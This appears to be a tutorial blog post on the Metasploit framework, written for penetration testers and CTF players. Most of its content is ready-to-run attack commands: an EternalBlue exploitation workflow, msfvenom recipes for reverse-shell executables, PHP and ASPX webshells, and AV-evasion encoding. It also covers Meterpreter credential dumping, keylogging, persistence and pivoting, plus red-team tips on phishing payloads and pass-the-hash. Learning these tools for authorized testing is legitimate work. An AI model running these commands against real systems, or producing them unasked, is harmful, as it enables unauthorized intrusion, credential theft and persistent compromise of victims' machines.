Metasploit – From Recon to Shell

2026-06-03 · 1 min read · Tools · metasploit msfconsole msfvenom exploitation pentesting

Metasploit is the most widely used exploitation framework. Learn msfconsole navigation, exploit and payload selection, Meterpreter post-exploitation, msfvenom payload crafting, and auxiliary scanning — from first launch to full shell.

01 What is Metasploit?

Metasploit Framework is an open-source exploitation framework that provides a unified interface for finding, exploiting, and post-exploiting vulnerabilities. It ships with thousands of modules:

Module TypePurpose
**Exploit**Triggers a vulnerability to gain code execution
**Payload**Code delivered after a successful exploit
**Auxiliary**Scanners, fuzzers, brute-forcers, info gathering
**Post**Post-exploitation: privesc, pivoting, credential dump
**Encoder**Obfuscate payloads to evade AV
**Nop**NOP sled generators for shellcode alignment

The two most-used tools in the suite are msfconsole (interactive shell) and msfvenom (standalone payload generator).

02 msfconsole – Basic Navigation

bash 
# Launch (with DB support if postgresql is running)
msfconsole

# Quiet launch (skip the banner)
msfconsole -q

# Run a single command and exit
msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run'

# Core commands inside msfconsole
help                  # show all commands
version               # framework version
search <term>         # search modules
use <module>          # select a module
info                  # show module details
show options          # show required/optional settings
show payloads         # payloads compatible with current exploit
set <OPT> <value>     # set an option
unset <OPT>           # clear an option
setg <OPT> <value>    # set globally (persists across modules)
run / exploit         # run the module
back                  # leave current module
sessions              # list active sessions
sessions -i <id>      # interact with a session
jobs                  # list background jobs
kill <id>             # kill a job

03 Searching and Selecting Modules

bash 
# Search by CVE
msf> search cve:2021-44228
msf> search cve:2017-0144

# Search by name / platform
msf> search eternalblue
msf> search type:exploit platform:windows smb
msf> search type:auxiliary scanner ssh

# Search by rank (excellent = most reliable)
msf> search rank:excellent type:exploit

# Use a module by search result index or full path
msf> use 0
msf> use exploit/windows/smb/ms17_010_eternalblue

# Show full module info (description, refs, reliability)
msf> info exploit/windows/smb/ms17_010_eternalblue

# Check if a target is vulnerable before exploiting
msf exploit(ms17_010_eternalblue)> check

04 Standard Exploit Workflow

bash 
# 1. Select the exploit
msf> use exploit/windows/smb/ms17_010_eternalblue

# 2. Review options
msf exploit(ms17_010_eternalblue)> show options

# 3. Set target
msf exploit(ms17_010_eternalblue)> set RHOSTS 10.10.10.40
msf exploit(ms17_010_eternalblue)> set RPORT 445      # usually default

# 4. List compatible payloads
msf exploit(ms17_010_eternalblue)> show payloads

# 5. Select payload
msf exploit(ms17_010_eternalblue)> set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. Set payload options
msf exploit(ms17_010_eternalblue)> set LHOST 10.10.14.5
msf exploit(ms17_010_eternalblue)> set LPORT 4444

# 7. Run
msf exploit(ms17_010_eternalblue)> run

# Run in background (keep msfconsole interactive)
msf exploit(ms17_010_eternalblue)> run -j

05 Payloads – Staged vs Stageless

The / separator in payload names has a specific meaning:

FormatExampleHow it works
**Staged** `type/arch/payload``windows/x64/meterpreter/reverse_tcp`Small stager connects back, downloads full payload
**Stageless** `type/arch/payload_tcp``windows/x64/meterpreter_reverse_tcp`Full payload in one binary, no second connection

Use staged when size matters (shellcode injection). Use stageless when the delivery is a standalone file and reliability matters (AV evasion, unstable networks).

Common payload families:

PayloadOSNotes
`meterpreter/reverse_tcp`Win/LinuxFeature-rich, in-memory
`meterpreter/reverse_https`Win/LinuxEncrypted, blends with HTTPS traffic
`shell/reverse_tcp`AllPlain netcat-style shell
`powershell/reverse_tcp`WindowsPowerShell session
`python/meterpreter/reverse_tcp`Linux/MacPure Python, no binary needed

06 Meterpreter – Post-Exploitation

Meterpreter runs entirely in memory, uses encrypted communication, and provides a rich API for post-exploitation. Once you have a session:

bash 
# Basic situational awareness
meterpreter> sysinfo           # OS, hostname, architecture
meterpreter> getuid            # current user
meterpreter> getpid            # current process ID
meterpreter> ps                # list running processes
meterpreter> netstat           # network connections
meterpreter> ipconfig          # network interfaces

# Filesystem
meterpreter> pwd               # current directory
meterpreter> ls                # list files
meterpreter> cd C:\\Users
meterpreter> cat 'flag.txt'
meterpreter> download file.txt /tmp/
meterpreter> upload /tmp/tool.exe C:\\Windows\\Temp\\
meterpreter> search -f *.txt -d C:\\Users  # find files

# Shell access
meterpreter> shell             # drop to OS shell (cmd.exe / bash)
meterpreter> execute -f cmd.exe -i -H   # hidden interactive shell

# Privilege escalation
meterpreter> getsystem         # attempt automated privesc
meterpreter> getuid            # verify if SYSTEM

# Credential dumping
meterpreter> hashdump          # dump local SAM hashes
meterpreter> run post/windows/gather/credentials/credential_collector

# Pivoting
meterpreter> run post/multi/manage/shell_to_meterpreter
meterpreter> portfwd add -l 3389 -p 3389 -r 10.10.10.5  # port forward RDP
meterpreter> run post/multi/manage/autoroute              # add pivot routes

# Persistence
meterpreter> run post/windows/manage/persistence_exe STARTUP=SCHEDULER

# Screenshot / keylogger
meterpreter> screenshot
meterpreter> keyscan_start
meterpreter> keyscan_dump
meterpreter> keyscan_stop

08 msfvenom – Standalone Payload Generation

msfvenom generates payloads as files — executables, shellcode, scripts — for delivery outside of msfconsole.

bash 
# List all payloads
msfvenom -l payloads

# List formats
msfvenom --list formats

# Windows x64 reverse Meterpreter EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f exe -o shell.exe

# Windows stageless (better for delivery)
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f exe -o shell_stageless.exe

# Linux ELF reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f elf -o shell.elf && chmod +x shell.elf

# PHP webshell
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f raw -o shell.php

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f raw -o shell.py

# ASP/ASPX webshell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f aspx -o shell.aspx

# Raw shellcode (for injection)
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f c          # C array
  -f py         # Python bytes
  -f raw > shell.bin

# Encode to bypass basic AV
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -e x64/xor_dynamic -i 5 \
  -f exe -o encoded.exe

09 Multi/Handler – Catching Shells

When you deliver a payload via msfvenom (or any other method), you need a listener to catch the connection. multi/handler is Metasploit's universal listener.

bash 
msf> use exploit/multi/handler
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> set LHOST 10.10.14.5
msf> set LPORT 4444
msf> set ExitOnSession false   # keep listener alive for multiple shells
msf> run -j                    # run as background job

# Catch multiple sessions
msf> sessions                  # list all active sessions
msf> sessions -i 1             # interact with session 1
msf> sessions -u 1             # upgrade session 1 to meterpreter

# Kill / background a session
meterpreter> background        # send session to background
meterpreter> exit              # close the session

11 Real-World Use Cases

Internal Penetration Tests
- Run db_nmap to populate hosts/services, then use vulns to prioritise targets
- Chain auxiliary scanners to identify weak credentials (SSH, SMB, FTP, RDP) across a /24 before touching a single exploit
- Use multi/handler with ExitOnSession false as a persistent listener for phishing payload callbacks
- Post-exploitation: run post/windows/gather/enum_domain maps AD structure from a single compromised workstation

Red Team Operations
- Generate stageless HTTPS Meterpreter payloads (meterpreter_reverse_https) for phishing — encrypted and blends with normal web traffic
- Use portfwd and autoroute to pivot through a DMZ host into the internal network without additional tooling
- hashdump → pass-the-hash with psexec module, or crack offline with hashcat

12 CTF / HTB Workflow

bash 
# Step 1: Recon with DB
msf> workspace -a <box_name>
msf> db_nmap -sV -sC -p- <target_ip>
msf> services

# Step 2: Check for known exploits on discovered services
msf> search type:exploit name:eternalblue
msf> search type:exploit name:shellshock
msf> search cve:2021-3156     # sudo heap overflow (Baron Samedit)

# Step 3: Exploit + handler
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS <target_ip>
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> set LHOST tun0            # HTB VPN interface
msf> run

# Step 4: Post-exploitation
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getsystem
meterpreter> hashdump
meterpreter> search -f user.txt -d C:\\
meterpreter> search -f root.txt -d C:\\

# Step 5: If you get a shell, upgrade to meterpreter
msf> use post/multi/manage/shell_to_meterpreter
msf> set SESSION 1
msf> run

# Step 6: Pivot to internal network
meterpreter> run post/multi/manage/autoroute
msf> use auxiliary/scanner/portscan/tcp
msf> set RHOSTS 172.16.0.0/24
msf> run
CTF Tips:
  • Set LHOST tun0 on HTB/TryHackMe — this auto-resolves to your VPN IP
  • sessions -u <id> upgrades a plain shell to Meterpreter in one command
  • If getsystem fails, run run post/multi/recon/local_exploit_suggester — it lists local privesc modules that match the target OS
  • For Linux boxes: run post/linux/gather/enum_system grabs OS info, cron jobs, SUID binaries, and sudo rules in one go
  • Use run -j to background exploits; catch sessions with sessions -i <id> after they connect

Quick Reference:

msfconsole -q                        # quiet start
search cve:<year>-<id>               # find module by CVE
set PAYLOAD <tab>                    # tab-complete payloads
show missing                         # see which options are unset
run -j / sessions / sessions -i <n>  # background + interact
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <fmt> -o out
